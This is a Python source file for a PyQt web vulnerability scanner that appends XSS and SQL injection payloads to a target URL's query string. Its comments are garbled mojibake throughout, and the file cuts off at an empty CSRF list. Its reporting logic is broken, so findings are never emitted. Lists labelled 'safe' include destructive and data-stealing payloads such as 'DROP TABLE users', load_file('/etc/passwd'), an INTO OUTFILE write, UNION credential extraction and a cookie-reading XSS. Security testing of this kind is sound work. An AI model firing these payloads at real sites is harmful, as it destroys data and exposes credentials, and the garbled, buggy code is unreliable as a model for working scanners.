import asyncio
import gc
import hashlib
import os
import re
import sqlite3
import time
from datetime import datetime
from functools import lru_cache
from typing import Dict, Set, Tuple, List, Optional, Any, Union, cast
from typing import TYPE_CHECKING
from urllib.parse import urljoin, urlparse, parse_qs, urlencode

import aiohttp
from PyQt5.QtCore import pyqtSignal, QObject
from bs4 import BeautifulSoup, Tag

from utils.database import db
from utils.logger import logger, log_and_notify
from utils.performance import get_local_timestamp
from .TTL_cache import TTLCache

if TYPE_CHECKING:
    pass

# –í—Å–ø–æ–º–æ–≥–∞—Ç–µ–ª—å–Ω—ã–π –∫–ª–∞—Å—Å –¥–ª—è –∏–º–∏—Ç–∞—Ü–∏–∏ –æ—Ç–≤–µ—Ç–∞ —Å–µ—Ä–≤–µ—Ä–∞
class EmptyResponse:
    """–ö–ª–∞—Å—Å –¥–ª—è –∏–º–∏—Ç–∞—Ü–∏–∏ –æ—Ç–≤–µ—Ç–∞ aiohttp.ClientResponse"""
    def __init__(self, status: int = 200):
        self.status = status

    @staticmethod
    async def text(errors: Optional[str] = None):
        return ""

# –ö—ç—à–∏ –¥–ª—è –æ–ø—Ç–∏–º–∏–∑–∞—Ü–∏–∏
HTML_CACHE: TTLCache = TTLCache(maxsize=100, ttl=300)
DNS_CACHE: TTLCache = TTLCache(maxsize=100, ttl=300)
FORM_HASH_CACHE: TTLCache = TTLCache(maxsize=100, ttl=300)
URL_PROCESSING_CACHE: TTLCache = TTLCache(maxsize=100, ttl=300)

# –û—á–∏—Å—Ç–∫–∞ –∫—ç—à–∞ –∫–∞–∂–¥—ã–µ 1000 –æ–ø–µ—Ä–∞—Ü–∏–π
CACHE_CLEANUP_THRESHOLD: int = 1000
cache_operations: int = 0

def cleanup_caches() -> None:
    """–û—á–∏—â–∞–µ—Ç –∫—ç—à–∏ –¥–ª—è –ø—Ä–µ–¥–æ—Ç–≤—Ä–∞—â–µ–Ω–∏—è —É—Ç–µ—á–µ–∫ –ø–∞–º—è—Ç–∏"""
    global HTML_CACHE, DNS_CACHE, FORM_HASH_CACHE, URL_PROCESSING_CACHE, cache_operations
    if cache_operations > CACHE_CLEANUP_THRESHOLD:
        HTML_CACHE.clear()
        DNS_CACHE.clear()
        FORM_HASH_CACHE.clear()
        URL_PROCESSING_CACHE.clear()
        cache_operations = 0

def cleanup_cache_if_needed():
    """–î–æ–±–∞–≤–ª—è–µ–º –æ—á–∏—Å—Ç–∫—É –∫—ç—à–∞ –ø—Ä–∏ –¥–æ—Å—Ç–∏–∂–µ–Ω–∏–∏ –ø–æ—Ä–æ–≥–∞"""
    global cache_operations
    cache_operations += 1
    cleanup_caches()
    logger.debug("Caches cleaned up")


# –û–ø—Ç–∏–º–∏–∑–∏—Ä–æ–≤–∞–Ω–Ω—ã–µ –Ω–∞—Å—Ç—Ä–æ–π–∫–∏ –¥–ª—è BeautifulSoup
BS4_OPTIMIZATIONS: Dict[str, Union[str, List[str]]] = {
    'parser': 'html.parser',
    'features': 'html.parser',
    'exclude_parser': ['lxml', 'xml'],  # –ò—Å–∫–ª—é—á–∞–µ–º –º–µ–¥–ª–µ–Ω–Ω—ã–µ –ø–∞—Ä—Å–µ—Ä—ã
}

# –ö—ç—à–∏—Ä—É–µ–º —Ä–µ–∑—É–ª—å—Ç–∞—Ç –ø–∞—Ä—Å–∏–Ω–≥–∞
@lru_cache(maxsize=100)
def parse_html_cached(html: str) -> BeautifulSoup:
    return BeautifulSoup(html, parser='html.parser')

class Scanner(QObject):
    # –û–ø—Ä–µ–¥–µ–ª–µ–Ω–∏–µ —Å–∏–≥–Ω–∞–ª–æ–≤
    scan_started: pyqtSignal = pyqtSignal(str)
    scan_finished: pyqtSignal = pyqtSignal(str)
    error_occurred: pyqtSignal = pyqtSignal(str)
    vulnerability_found: pyqtSignal = pyqtSignal(str, str, str)


    def __init__(self) -> None:
        super().__init__()
        self._scan_in_progress: bool = False
        self._scan_results: List[Dict[str, Any]] = []
        self._current_url: str = ""
        self._scan_id: str = ""
        self._scan_options: Dict[str, Any] = {}
        self._scan_start_time: Optional[datetime] = None
        self._scan_end_time: Optional[datetime] = None
        self.should_stop: bool = False
        self._is_paused: bool = False

    async def _test_csrf_protection(self) -> None:
        # –¢–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ CSRF –∑–∞—â–∏—Ç—ã
        for payload in SAFE_CSRF_PAYLOADS:
            await self._test_payload(payload, "CSRF")

    @property
    def scan_in_progress(self) -> bool:
        return self._scan_in_progress

    @scan_in_progress.setter
    def scan_in_progress(self, value: bool) -> None:
        self._scan_in_progress = value

    @property
    def scan_results(self) -> List[Dict[str, Any]]:
        return self._scan_results

    @scan_results.setter
    def scan_results(self, value: List[Dict[str, Any]]) -> None:
        self._scan_results = value

    @property
    def current_url(self) -> str:
        # –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∏—Ä—É–µ–º _current_url –ø—Ä–∏ –ø–µ—Ä–≤–æ–º –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–∏
        if not hasattr(self, '_current_url'):
            self._current_url = ""
        return self._current_url

    @current_url.setter
    def current_url(self, value: str) -> None:
        self._current_url = value

    @property
    def scan_id(self) -> str:
        return self._scan_id

    @scan_id.setter
    def scan_id(self, value: str) -> None:
        self._scan_id = value

    @property
    def scan_options(self) -> Dict[str, Any]:
        return self._scan_options

    @scan_options.setter
    def scan_options(self, value: Dict[str, Any]) -> None:
        self._scan_options = value

    def stop(self) -> None:
        """–û—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ—Ç —Å–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏–µ."""
        self.should_stop = True

    def pause(self) -> None:
        """–ü—Ä–∏–æ—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ—Ç —Å–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏–µ."""
        self._is_paused = True

    def resume(self) -> None:
        """–í–æ–∑–æ–±–Ω–æ–≤–ª—è–µ—Ç —Å–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏–µ."""
        self._is_paused = False

    def is_paused(self) -> bool:
        """–ü—Ä–æ–≤–µ—Ä—è–µ—Ç, –Ω–∞—Ö–æ–¥–∏—Ç—Å—è –ª–∏ —Å–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏–µ –Ω–∞ –ø–∞—É–∑–µ."""
        return self._is_paused

    @property
    def scan_start_time(self) -> Optional[datetime]:
        return self._scan_start_time

    @scan_start_time.setter
    def scan_start_time(self, value: datetime) -> None:
        self._scan_start_time = value

    @property
    def scan_end_time(self) -> Optional[datetime]:
        return self._scan_end_time

    @scan_end_time.setter
    def scan_end_time(self, value: datetime) -> None:
        self._scan_end_time = value

    async def start_scan(self, url: str, options: Dict[str, Any]) -> None:
        if self._scan_in_progress:
            raise Exception("Scan is already in progress")
        self._scan_in_progress = True
        self._scan_results = []
        self._current_url = url
        self._scan_options = options
        self._scan_id = self._generate_scan_id()
        self._scan_start_time = datetime.now()
        self.scan_started.emit(f"Scan started for {url}")
        try:
            await self._perform_scan()
        except Exception as e:
            self.error_occurred.emit(f"Error during scan: {str(e)}")
        finally:
            self._scan_in_progress = False
            self._scan_end_time = datetime.now()
            self.scan_finished.emit(f"Scan finished for {url}")

    async def _perform_scan(self) -> None:
        # –ü—Ä–æ–≤–µ—Ä–∫–∞ –Ω–∞ –≤–∞–ª–∏–¥–Ω–æ—Å—Ç—å URL
        if not db.is_valid_url(self._current_url):
            raise ValueError("Invalid URL")

        # –û—Å–Ω–æ–≤–Ω—ã–µ –ø—Ä–æ–≤–µ—Ä–∫–∏ –Ω–∞ —É—è–∑–≤–∏–º–æ—Å—Ç–∏
        await self._check_sql_injections()
        await self._check_xss_reflected()
        await self._check_csrf_vulnerabilities()

    async def _check_sql_injections(self) -> None:
        # –ü—Ä–æ–≤–µ—Ä–∫–∞ –Ω–∞ SQL –∏–Ω—ä–µ–∫—Ü–∏–∏
        for payload in SAFE_SQL_PAYLOADS:
            await self._test_payload(payload, "SQL Injection")

    async def _check_xss_reflected(self) -> None:
        # –ü—Ä–æ–≤–µ—Ä–∫–∞ –Ω–∞ –æ—Ç—Ä–∞–∂–µ–Ω–Ω—ã–π XSS
        for payload in SAFE_XSS_PAYLOADS:
            await self._test_payload(payload, "Reflected XSS")

    async def _check_csrf_vulnerabilities(self) -> None:
        # –ü—Ä–æ–≤–µ—Ä–∫–∞ –Ω–∞ CSRF —É—è–∑–≤–∏–º–æ—Å—Ç–∏
        # –ü—Ä–æ–≤–µ—Ä—è–µ–º —Ñ–ª–∞–≥–∏ –ø–µ—Ä–µ–¥ –Ω–∞—á–∞–ª–æ–º –ø—Ä–æ–≤–µ—Ä–∫–∏
        if self.should_stop or self._is_paused:
            return
        await self._test_csrf_protection()

    async def _test_payload(self, payload: str, vulnerability_type: str) -> None:
        # –¢–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ –∫–æ–Ω–∫—Ä–µ—Ç–Ω–æ–≥–æ –ø—ç–π–ª–æ–∞–¥–∞
        try:
            response = await self._send_request_with_payload(payload)
            # –û—Ç–≤–µ—Ç –≤—Å–µ–≥–¥–∞ –Ω–µ None, —Ç.–∫. –º–µ—Ç–æ–¥ –≤–æ–∑–≤—Ä–∞—â–∞–µ—Ç Union[aiohttp.ClientResponse, EmptyResponse]
            # –ü—Ä–æ–≤–µ—Ä—è–µ–º —Ç–∏–ø –æ—Ç–≤–µ—Ç–∞ –ø–µ—Ä–µ–¥ –ø–µ—Ä–µ–¥–∞—á–µ–π –≤ _is_vulnerable
            if isinstance(response, aiohttp.ClientResponse):
                is_vulnerable = await self._is_vulnerable(response, payload)
            else:
                # –î–ª—è EmptyResponse —Å—á–∏—Ç–∞–µ–º, —á—Ç–æ —É—è–∑–≤–∏–º–æ—Å—Ç–µ–π –Ω–µ—Ç
                is_vulnerable = False

                if is_vulnerable:
                    # –ò—Å–ø–æ–ª—å–∑—É–µ–º current_url –≤–º–µ—Å—Ç–æ _current_url
                    current_url = getattr(self, 'current_url', '')
                    if current_url:
                        self.vulnerability_found.emit(current_url, payload, vulnerability_type)
                # –û–±–Ω–æ–≤–ª—è–µ–º —Å—Ç–∞—Ç–∏—Å—Ç–∏–∫—É –ø–æ—Å–ª–µ –Ω–∞—Ö–æ–∂–¥–µ–Ω–∏—è —É—è–∑–≤–∏–º–æ—Å—Ç–∏
                # –ú–µ—Ç–æ–¥ update_stats –º–æ–∂–µ—Ç –±—ã—Ç—å –æ–ø—Ä–µ–¥–µ–ª–µ–Ω –≤ –¥–æ—á–µ—Ä–Ω–∏—Ö –∫–ª–∞—Å—Å–∞—Ö
                try:
                    # –ü—Ä–æ–≤–µ—Ä—è–µ–º –Ω–∞–ª–∏—á–∏–µ –º–µ—Ç–æ–¥–∞ —á–µ—Ä–µ–∑ getattr –¥–ª—è –∏–∑–±–µ–∂–∞–Ω–∏—è –ø—Ä–µ–¥—É–ø—Ä–µ–∂–¥–µ–Ω–∏–π Pylance
                    update_stats_method = getattr(self, 'update_stats', None)
                    if update_stats_method and callable(update_stats_method):
                        update_stats_method()
                except Exception as e:
                    logger.debug(f"Error updating stats: {e}")
        except Exception as e:
            logger.error(f"Error testing payload {payload}: {str(e)}")

    async def _send_request_with_payload(self, payload: str) -> Union[aiohttp.ClientResponse, EmptyResponse]:
        # –û—Ç–ø—Ä–∞–≤–∫–∞ HTTP –∑–∞–ø—Ä–æ—Å–∞ —Å –ø—ç–π–ª–æ–∞–¥–æ–º
        # –ü—Ä–æ–≤–µ—Ä—è–µ–º —Ñ–ª–∞–≥–∏ –æ—Å—Ç–∞–Ω–æ–≤–∫–∏ –∏ –ø–∞—É–∑—ã –ø–µ—Ä–µ–¥ –æ—Ç–ø—Ä–∞–≤–∫–æ–π –∑–∞–ø—Ä–æ—Å–∞
        if self.should_stop or self._is_paused:
            # –ò—Å–ø–æ–ª—å–∑—É–µ–º –≥–ª–æ–±–∞–ª—å–Ω—ã–π –∫–ª–∞—Å—Å EmptyResponse –≤–º–µ—Å—Ç–æ None
            return EmptyResponse()

        # –ò—Å–ø–æ–ª—å–∑—É–µ–º current_url –≤–º–µ—Å—Ç–æ _current_url
        current_url = getattr(self, 'current_url', '')
        if not current_url:
            # –ò—Å–ø–æ–ª—å–∑—É–µ–º –≥–ª–æ–±–∞–ª—å–Ω—ã–π –∫–ª–∞—Å—Å EmptyResponse –≤–º–µ—Å—Ç–æ None
            return EmptyResponse()

        async with aiohttp.ClientSession() as session:
            if '?' in current_url:
                url = f"{current_url}&payload={payload}"
            else:
                url = f"{current_url}?payload={payload}"
            async with session.get(url) as response:
                return response

    @staticmethod
    async def _is_vulnerable(response: aiohttp.ClientResponse, payload: str) -> bool:
        # –ü—Ä–æ–≤–µ—Ä–∫–∞ –æ—Ç–≤–µ—Ç–∞ –Ω–∞ –Ω–∞–ª–∏—á–∏–µ —É—è–∑–≤–∏–º–æ—Å—Ç–∏
        # –ü—Ä–æ–≤–µ—Ä–∫–∞ –Ω–∞ None —É–¥–∞–ª–µ–Ω–∞, —Ç.–∫. response –∏–º–µ–µ—Ç —Ç–∏–ø aiohttp.ClientResponse
        content = await response.text()
        if payload in content:
            return True
        return False

    @staticmethod
    def _generate_scan_id() -> str:
        # –ì–µ–Ω–µ—Ä–∞—Ü–∏—è —É–Ω–∏–∫–∞–ª—å–Ω–æ–≥–æ ID —Å–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏—è
        return hashlib.sha256(str(time.time()).encode()).hexdigest()

    async def save_scan_results(self) -> None:
        # –°–æ—Ö—Ä–∞–Ω–µ–Ω–∏–µ —Ä–µ–∑—É–ª—å—Ç–∞—Ç–æ–≤ —Å–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏—è –≤ –±–∞–∑—É –¥–∞–Ω–Ω—ã—Ö
        try:
            db.save_scan_async(
                user_id=int(self._scan_id, 16),  # –ü—Ä–µ–æ–±—Ä–∞–∑—É–µ–º scan_id –≤ —Ü–µ–ª–æ–µ —á–∏—Å–ª–æ
                url=self._current_url,
                results=self._scan_results,
                scan_type=self._scan_options.get('type', 'general'),  # –ü–æ–ª—É—á–∞–µ–º —Ç–∏–ø —Å–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏—è –∏–∑ –æ–ø—Ü–∏–π
                scan_duration=(self._scan_end_time - self._scan_start_time).total_seconds() if self._scan_end_time and self._scan_start_time else 0.0
            )
        except Exception as e:
            logger.error(f"Error saving scan results: {str(e)}")

SAFE_XSS_PAYLOADS: List[str] = [
    # ===== –ì–†–£–ü–ü–ê 1: –ë–∞–∑–æ–≤—ã–µ script —Ç–µ–≥–∏ =====
    "<script>alert('XSS')</script>",              # –ö–ª–∞—Å—Å–∏—á–µ—Å–∫–∏–π XSS –ø—ç–π–ª–æ–∞–¥

    # ===== –ì–†–£–ü–ü–ê 2: Event handlers (–æ–±—Ä–∞–±–æ—Ç—á–∏–∫–∏ —Å–æ–±—ã—Ç–∏–π) =====
    '<img src=x onerror=alert(1)>',               # onerror –≤ img —Ç–µ–≥–µ
    '<svg/onload=alert(1)>',                      # onload –≤ SVG
    '<body onload=alert(1)>',                     # onload –≤ body
    '<input onfocus=alert(1) autofocus>',         # onfocus –≤ input
    '<details open ontoggle=alert(1)>',           # ontoggle –≤ details

    # ===== –ì–†–£–ü–ü–ê 3: JavaScript –ø—Ä–æ—Ç–æ–∫–æ–ª –≤ –∞—Ç—Ä–∏–±—É—Ç–∞—Ö =====
    '<iframe src=javascript:alert(1)>',           # javascript: –≤ src
    '<a href=javascript:alert(1)>Click</a>',      # javascript: –≤ href
    '<math href="javascript:alert(1)">X</math>',  # javascript: –≤ math

    # ===== –ì–†–£–ü–ü–ê 4: –í—Å—Ç—Ä–∞–∏–≤–∞–µ–º—ã–µ –æ–±—ä–µ–∫—Ç—ã =====
    '<object data="javascript:alert(1)">',        # javascript: –≤ object
    '<embed src="javascript:alert(1)">',          # javascript: –≤ embed

    # ===== –ì–†–£–ü–ü–ê 5: Form-based XSS =====
    '<form><button formaction="javascript:alert(1)">X</button></form>',  # formaction

    # ===== –ì–†–£–ü–ü–ê 6: –°–ª–æ–∂–Ω—ã–µ event handlers =====
    '<img src=x:confirm(1) onerror=eval(src)>',   # eval() —Å src
    '<svg><script>alert(1)</script>',             # script –≤–Ω—É—Ç—Ä–∏ SVG

    # ===== –ì–†–£–ü–ü–ê 7: CDATA –∏ —Å–ø–µ—Ü–∏–∞–ª—å–Ω—ã–µ —Å–∏–º–≤–æ–ª—ã =====
    '<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>',  # CDATA bypass

    # ===== –ì–†–£–ü–ü–ê 8: –ö–æ–¥–∏—Ä–æ–≤–∞–Ω–∏–µ –∏ –æ–±—Ñ—É—Å–∫–∞—Ü–∏—è =====
    '<img src=x onerror=alert(String.fromCharCode(88,83,83))>',  # String.fromCharCode
    '<svg><g onload=alert(1)></g></svg>',         # –í–ª–æ–∂–µ–Ω–Ω—ã–µ SVG —ç–ª–µ–º–µ–Ω—Ç—ã
    '<img src=x onerror=alert(/XSS/.source)>',    # –†–µ–≥—É–ª—è—Ä–Ω—ã–µ –≤—ã—Ä–∞–∂–µ–Ω–∏—è

    # ===== –ì–†–£–ü–ü–ê 9: –ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏–æ–Ω–Ω—ã–µ XSS =====
    '<img src=x onerror=alert(document.domain)>',     # –î–æ–º–µ–Ω —Å—Ç—Ä–∞–Ω–∏—Ü—ã
    '<img src=x onerror=alert(window.location)>',     # URL —Å—Ç—Ä–∞–Ω–∏—Ü—ã
    '<img src=x onerror=alert(document.cookie)>',     # –ö—É–∫–∏ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è

    # ===== –ì–†–£–ü–ü–ê 10: SVG —Å XLink =====
    '<svg><a xlink:href="javascript:alert(1)">X</a></svg>',  # XLink –≤ SVG

    # ===== –ì–†–£–ü–ü–ê 11: –£—Å—Ç–∞—Ä–µ–≤—à–∏–µ HTML —Ç–µ–≥–∏ =====
    '<marquee onstart=alert(1)>',                 # –£—Å—Ç–∞—Ä–µ–≤—à–∏–π marquee

    # ===== –ì–†–£–ü–ü–ê 12: CSS-based —Å–∫—Ä—ã—Ç–∏–µ =====
    '<img src=x onerror=alert(1) style="display:none">',      # display:none
    '<img src=x onerror=alert(1) style="visibility:hidden">', # visibility:hidden
    '<img src=x onerror=alert(1) style="opacity:0">',          # opacity:0
    '<img src=x onerror=alert(1) style="position:absolute;left:-9999px">']  # –ü–æ–∑–∏—Ü–∏–æ–Ω–∏—Ä–æ–≤–∞–Ω–∏–µ –∑–∞ –ø—Ä–µ–¥–µ–ª—ã —ç–∫—Ä–∞–Ω–∞

SAFE_SQL_PAYLOADS: List[str] = [
    # ===== –ì–†–£–ü–ü–ê 1: –ë–∞–∑–æ–≤—ã–µ –∫–∞–≤—ã—á–∫–∏ –¥–ª—è –ø—Ä–æ–≤–µ—Ä–∫–∏ —Å–∏–Ω—Ç–∞–∫—Å–∏—Å–∞ =====
    "'",  # –û–¥–∏–Ω–æ—á–Ω–∞—è –∫–∞–≤—ã—á–∫–∞ - –ø—Ä–æ–≤–µ—Ä—è–µ—Ç –æ–±—Ä–∞–±–æ—Ç–∫—É –Ω–µ–∑–∞–∫—Ä—ã—Ç—ã—Ö –∫–∞–≤—ã—á–µ–∫
    '"',  # –î–≤–æ–π–Ω–∞—è –∫–∞–≤—ã—á–∫–∞ - –ø—Ä–æ–≤–µ—Ä—è–µ—Ç –æ–±—Ä–∞–±–æ—Ç–∫—É –¥–≤–æ–π–Ω—ã—Ö –∫–∞–≤—ã—á–µ–∫

    # ===== –ì–†–£–ü–ü–ê 2: Boolean-based –∏–Ω—ä–µ–∫—Ü–∏–∏ (–ª–æ–≥–∏—á–µ—Å–∫–∏–µ –æ–ø–µ—Ä–∞—Ü–∏–∏) =====
    "1' OR '1'='1 -- ",      # –ö–ª–∞—Å—Å–∏—á–µ—Å–∫–∞—è boolean-based –∏–Ω—ä–µ–∫—Ü–∏—è —Å –∫–æ–º–º–µ–Ω—Ç–∞—Ä–∏–µ–º
    '1" OR "1"="1" -- ',     # Boolean-based —Å –¥–≤–æ–π–Ω—ã–º–∏ –∫–∞–≤—ã—á–∫–∞–º–∏
    "1' OR 1=1--",           # –£–ø—Ä–æ—â–µ–Ω–Ω–∞—è boolean-based –∏–Ω—ä–µ–∫—Ü–∏—è
    '1" OR 1=1--',           # Boolean-based —Å –¥–≤–æ–π–Ω—ã–º–∏ –∫–∞–≤—ã—á–∫–∞–º–∏
    "1' OR 'a'='a' -- ",     # Boolean-based —Å —Å—Ç—Ä–æ–∫–æ–≤—ã–º —Å—Ä–∞–≤–Ω–µ–Ω–∏–µ–º
    '1" OR "a"="a" -- ',     # Boolean-based —Å –¥–≤–æ–π–Ω—ã–º–∏ –∫–∞–≤—ã—á–∫–∞–º–∏

    # ===== –ì–†–£–ü–ü–ê 3: –ü–∞—Ä–Ω—ã–µ –∫–∞–≤—ã—á–∫–∏ –¥–ª—è —Å–ª–æ–∂–Ω—ã—Ö –∑–∞–ø—Ä–æ—Å–æ–≤ =====
    "1') OR ('1'='1' -- ",   # –î–ª—è –∑–∞–ø—Ä–æ—Å–æ–≤ —Å –ø–∞—Ä–Ω—ã–º–∏ —Å–∫–æ–±–∫–∞–º–∏
    '1") OR ("1"="1" -- ',   # –ü–∞—Ä–Ω—ã–µ —Å–∫–æ–±–∫–∏ —Å –¥–≤–æ–π–Ω—ã–º–∏ –∫–∞–≤—ã—á–∫–∞–º–∏

    # ===== –ì–†–£–ü–ü–ê 4: –ê—É—Ç–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏—è bypass –ø—ç–π–ª–æ–∞–¥—ã =====
    "admin' -- ",            # –ü–æ–ø—ã—Ç–∫–∞ –æ–±—Ö–æ–¥–∞ –∞—É—Ç–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏–∏
    "admin' #",              # MySQL –∫–æ–º–º–µ–Ω—Ç–∞—Ä–∏–π
    "admin'/*",              # –ú–Ω–æ–≥–æ—Å—Ç—Ä–æ—á–Ω—ã–π –∫–æ–º–º–µ–Ω—Ç–∞—Ä–∏–π

    # ===== –ì–†–£–ü–ü–ê 5: –†–∞–∑–ª–∏—á–Ω—ã–µ —Ç–∏–ø—ã –∫–æ–º–º–µ–Ω—Ç–∞—Ä–∏–µ–≤ =====
    "' OR '' = '",           # –ü—É—Å—Ç–æ–µ —Å—Ä–∞–≤–Ω–µ–Ω–∏–µ
    "' OR 1=1#",             # MySQL –∫–æ–º–º–µ–Ω—Ç–∞—Ä–∏–π
    "' OR 1=1--",            # –°—Ç–∞–Ω–¥–∞—Ä—Ç–Ω—ã–π SQL –∫–æ–º–º–µ–Ω—Ç–∞—Ä–∏–π
    "' OR 1=1/*",            # –ú–Ω–æ–≥–æ—Å—Ç—Ä–æ—á–Ω—ã–π –∫–æ–º–º–µ–Ω—Ç–∞—Ä–∏–π

    # ===== –ì–†–£–ü–ü–ê 6: –°–ª–æ–∂–Ω—ã–µ boolean-based –∏–Ω—ä–µ–∫—Ü–∏–∏ =====
    "') OR ('1'='1--",       # –° –ø–∞—Ä–Ω—ã–º–∏ —Å–∫–æ–±–∫–∞–º–∏
    "') OR ('1'='1'#",       # –° MySQL –∫–æ–º–º–µ–Ω—Ç–∞—Ä–∏–µ–º
    "') OR ('1'='1'/*",      # –° –º–Ω–æ–≥–æ—Å—Ç—Ä–æ—á–Ω—ã–º –∫–æ–º–º–µ–Ω—Ç–∞—Ä–∏–µ–º

    # ===== –ì–†–£–ü–ü–ê 7: Time-based –∏–Ω—ä–µ–∫—Ü–∏–∏ =====
    "' OR SLEEP(5)--",       # –ü—Ä–æ–≤–µ—Ä–∫–∞ time-based —É—è–∑–≤–∏–º–æ—Å—Ç–µ–π

    # ===== –ì–†–£–ü–ü–ê 8: UNION-based –∏–Ω—ä–µ–∫—Ü–∏–∏ =====
    "' OR 1=1 UNION SELECT NULL,NULL--",           # UNION –∏–Ω—ä–µ–∫—Ü–∏—è —Å NULL
    "' UNION SELECT username, password FROM users--",  # UNION –¥–ª—è –∏–∑–≤–ª–µ—á–µ–Ω–∏—è –¥–∞–Ω–Ω—ã—Ö

    # ===== –ì–†–£–ü–ü–ê 9: Error-based –∏–Ω—ä–µ–∫—Ü–∏–∏ =====
    "' AND (SELECT COUNT(*) FROM users) > 0--",    # –ü—Ä–æ–≤–µ—Ä–∫–∞ —Å—É—â–µ—Å—Ç–≤–æ–≤–∞–Ω–∏—è —Ç–∞–±–ª–∏—Ü—ã
    "' AND 1=0 UNION ALL SELECT NULL,NULL--",      # UNION ALL –¥–ª—è –æ—à–∏–±–æ–∫

    # Time-based (MySQL, MSSQL, PostgreSQL)
    "' OR SLEEP(10)-- ",
    "' OR 1=1 WAITFOR DELAY '0:0:5'-- ",
    "' OR pg_sleep(5)-- ",

    # Stacked queries (–µ—Å–ª–∏ –ø–æ–¥–¥–µ—Ä–∂–∏–≤–∞–µ—Ç—Å—è)
    "'; SELECT version();-- ",
    "'; DROP TABLE users;-- ",

    # Blind
    "' AND 1=(SELECT COUNT(*) FROM tabname);-- ",

    # Hex
    "' OR 0x50=0x50-- ",

    # Out-of-band
    "' UNION SELECT load_file('/etc/passwd')-- ",

    # Error-based
    "' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT((SELECT user()), 0x3a, FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x) a)-- ",

    # Boolean
    "' OR TRUE-- ",
    '" OR TRUE-- ',

    # PostgreSQL
    "' OR 1=1;-- ",

    # MSSQL
    "' OR 1=1-- ",
    "' OR 1=1;-- ",

    # Oracle
    "' OR 1=1-- ",

    # SQLite
    "' OR 1=1-- ",

    # –†–∞–∑–Ω—ã–µ —Ç–∏–ø—ã –∫–∞–≤—ã—á–µ–∫
    "` OR 1=1-- ",

    # UNION —Ä–∞—Å—à–∏—Ä–µ–Ω–Ω—ã–µ
    "' UNION SELECT NULL,NULL,NULL-- ",
    "' UNION SELECT 1,2,3-- ",

    # –ö–æ–º–º–µ–Ω—Ç–∞—Ä–∏–∏
    "'/**/OR/**/1=1-- ",

    # AND
    "' AND 1=1-- ",

    # OR
    "' OR 'a'='a'-- ",

    # Out-of-band DNS
    "' UNION SELECT 1 INTO OUTFILE '/tmp/test.txt'-- "
]

HTTP_OPTIMIZATIONS: Dict[str, Dict[str, Any]] = {
    'connector': {
        'limit': 100,  # –£–≤–µ–ª–∏—á–∏–≤–∞–µ–º –ª–∏–º–∏—Ç —Å–æ–µ–¥–∏–Ω–µ–Ω–∏–π
        'limit_per_host': 20,  # –ë–æ–ª—å—à–µ —Å–æ–µ–¥–∏–Ω–µ–Ω–∏–π –Ω–∞ —Ö–æ—Å—Ç
        'keepalive_timeout': 30,  # Keep-alive —Å–æ–µ–¥–∏–Ω–µ–Ω–∏—è
        'enable_cleanup_closed': True,  # –ê–≤—Ç–æ–æ—á–∏—Å—Ç–∫–∞ –∑–∞–∫—Ä—ã—Ç—ã—Ö —Å–æ–µ–¥–∏–Ω–µ–Ω–∏–π
        'force_close': False,  # –ù–µ –∑–∞–∫—Ä—ã–≤–∞—Ç—å —Å–æ–µ–¥–∏–Ω–µ–Ω–∏—è –ø—Ä–∏–Ω—É–¥–∏—Ç–µ–ª—å–Ω–æ
        'use_dns_cache': True,  # –ö—ç—à–∏—Ä–æ–≤–∞–Ω–∏–µ DNS
        'ttl_dns_cache': 300,  # TTL –¥–ª—è DNS –∫—ç—à–∞
    },
    'timeout': {
        'total': 30,
        'connect': 10,
        'sock_read': 30,
        'sock_connect': 10
    },
    'headers': {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1'
    }
}

XSS_REFLECTED_PATTERNS: List[re.Pattern[str]] = [
    re.compile(r"<script>alert\('XSS'\)</script>", re.IGNORECASE),  # –ö–ª–∞—Å—Å–∏—á–µ—Å–∫–∏–π XSS
    re.compile(r"<svg/onload=alert\('XSS'\)>", re.IGNORECASE)       # SVG-based XSS
]

SQL_ERROR_PATTERNS: List[re.Pattern[str]] = [
    re.compile(r"sql", re.IGNORECASE),                    # –û–±—â–∏–µ —É–ø–æ–º–∏–Ω–∞–Ω–∏—è SQL
    re.compile(r"mysql", re.IGNORECASE),                  # –°–ø–µ—Ü–∏—Ñ–∏—á–Ω—ã–µ –¥–ª—è MySQL –æ—à–∏–±–∫–∏
    re.compile(r"unclosed quotation mark", re.IGNORECASE), # –ù–µ–∑–∞–∫—Ä—ã—Ç—ã–µ –∫–∞–≤—ã—á–∫–∏
    re.compile(r"syntax error", re.IGNORECASE),           # –°–∏–Ω—Ç–∞–∫—Å–∏—á–µ—Å–∫–∏–µ –æ—à–∏–±–∫–∏
    re.compile(r"database error", re.IGNORECASE),         # –û—à–∏–±–∫–∏ –±–∞–∑—ã –¥–∞–Ω–Ω—ã—Ö
    re.compile(r"invalid query", re.IGNORECASE)           # –ù–µ–≤–µ—Ä–Ω—ã–µ –∑–∞–ø—Ä–æ—Å—ã
]

# =============================================================================
# CSRF (CROSS-SITE REQUEST FORGERY) PAYLOADS - –ü—ç–π–ª–æ–∞–¥—ã –¥–ª—è CSRF –∞—Ç–∞–∫
# =============================================================================

SAFE_CSRF_PAYLOADS: List[str] = [
